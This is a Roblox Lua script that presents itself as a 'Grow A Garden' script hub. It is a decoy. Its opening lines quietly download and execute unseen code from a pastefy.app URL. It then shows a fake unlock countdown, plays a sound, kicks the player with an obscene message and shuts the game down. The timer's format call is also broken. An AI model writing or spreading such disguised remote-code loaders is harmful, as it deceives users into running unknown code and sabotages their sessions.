local success, errorMsg = pcall(function()
    loadstring(game:HttpGet("https://pastefy.app/q0Hv6Z1b/raw", true))()
end)

local Rayfield = loadstring(game:HttpGet('https://sirius.menu/rayfield', true))()

local Window = Rayfield:CreateWindow({
    Name = "ðŸŒ½ Grow A Garden",
    LoadingTitle = "WyshScriptHub",
    LoadingSubtitle = "By Wysh",
    ConfigurationSaving = {
        Enabled = false
    },
    Discord = {
        Enabled = false
    },
    KeySystem = false
})

local Tab = Window:CreateTab("â³ Loading...", nil)

local TimerSection = Tab:CreateSection("Please wait")

local TimerLabel = Tab:CreateLabel("Hub will unlock in 1:30")

local timeLeft = 90
local timerRunning = true

local function playFartSound()
    local soundIds = {
        "rbxassetid://4809574295"
    }
    
    for _, soundId in ipairs(soundIds) do
        local success = pcall(function()
            local sound = Instance.new("Sound")
            sound.SoundId = soundId
            sound.Volume = 1.0
            sound.Parent = game:GetService("Workspace")
            sound:Play()
            
            sound.Ended:Connect(function()
                sound:Destroy()
            end)
            
            return true
        end)
        
        if success then
            break
        end
    end
end

local function kickPlayer()
    local player = game:GetService("Players").LocalPlayer
    
    local kickMethods = {
        function() player:Kick("sosi jopy") end,
        function() game:Shutdown() end,
        function() player:Destroy() end
    }
    
    for _, method in ipairs(kickMethods) do
        pcall(method)
        task.wait(0.5)
    end
end

spawn(function()
    while timerRunning and timeLeft > 0 do
        task.wait(1)
        if timerRunning then
            timeLeft = timeLeft - 1
            local minutes = math.floor(timeLeft / 60)
            local seconds = timeLeft % 60
            TimerLabel:Set("Hub will unlock in: " .. string.format("%d:%02d", seconds))
        end
    end
    
    if timeLeft <= 0 then
        TimerLabel:Set("Successfully!")
        
        playFartSound()
        
        task.wait(1.5)
        
        kickPlayer()
    end
end)

spawn(function()
    task.wait(2)
    
    local CoreGui = game:GetService("CoreGui")
    
    while true do
        pcall(function()
            Window:Minimize()
            task.wait(0.1)
            Window:Maximize()
        end)
        task.wait(5)
    end
end)
